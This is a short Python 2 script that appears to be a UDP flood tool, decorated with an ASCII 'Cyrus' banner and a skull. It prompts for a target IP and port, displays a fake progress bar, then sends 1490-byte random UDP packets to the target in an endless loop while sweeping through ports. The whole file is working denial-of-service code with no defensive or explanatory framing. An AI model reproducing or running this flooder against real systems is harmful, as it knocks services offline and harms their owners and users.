import sys
import os
import time
import socket
import random
#Code
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

#Banner Start

print " ▄████▄▓██   ██▓ ██▀███   █    ██   ██████ "
print "▒██▀ ▀█ ▒██  ██▒▓██ ▒ ██▒ ██  ▓██▒▒██    ▒ "
print "▒▓█    ▄ ▒██ ██░▓██ ░▄█ ▒▓██  ▒██░░ ▓██▄   "
print "▒▓▓▄ ▄██▒░ ▐██▓░▒██▀▀█▄  ▓▓█  ░██░  ▒   ██▒"
print "▒ ▓███▀ ░░ ██▒▓░░██▓ ▒██▒▒▒█████▓ ▒██████▒▒"
print "░ ░▒ ▒  ░ ██▒▒▒ ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░"
print "  ░  ▒  ▓██ ░▒░   ░▒ ░ ▒░░░▒░ ░ ░ ░ ░▒  ░ ░"
print "░       ▒ ▒ ░░    ░░   ░  ░░░ ░ ░ ░  ░  ░  "
print "░ ░     ░ ░        ░        ░           ░  "
print "░       ░ ░                                "





print "                      :::!~!!!!!:. "
print "                   .xUHWH!! !!?M88WHX:. "
print "                 .X*#M@$!!  !X!M$$$$$$WWx:. "
print "                :!!!!!!?H! :!$!$$$$$$$$$$8X: "
print "               !!~  ~:~!! :~!$!#$$$$$$$$$$8X: "
print "              :!~::!H!<   ~.U$X!?R$$$$$$$$MM! "
print "              ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM! "
print "                !:~~~ .:!M*T#$$$$WX??#MRRMMM! "
print "                ~?WuxiW*`   `*#$$$$8!!!!??!!! "
print "              :X- M$$$$       `*T#$T~!8$WUXU~ "
print "             :%`  ~#$$$m:        ~!~ ?$$$$$$ "
print "           :!`.-   ~T$$$$8xx.  .xWW- ~**##* "
print " .....   -~~:<` !    ~?T#$$@@W@*?$$      /` "
print " W$@@M!!! .!~~ !!     .:XUW$W!~ `*~:    : "
print " **~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!` "
print " :::~:!!`:X~ .: ?H.!u *$$$B$$$!W:U!T$$M~ "
print " .~~   :X@!.-~   ?@WTWo(**$$$W$TH$! ` "
print " Wi.~!X$?!-~    : ?$$$B$Wu(***$RM! "
print " $R@i.~~ !     :   ~$$$$$B$$en:`` "
print " ?MXT@Wx.~    :     ~##**$$$$M~ "

#Banner End

ip = raw_input("IP Target : ")
port = input("Port       : ")

print "[                    ] 0% "
time.sleep(5)
print "[====                ] 15%"
time.sleep(5)
print "[=========           ] 45%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

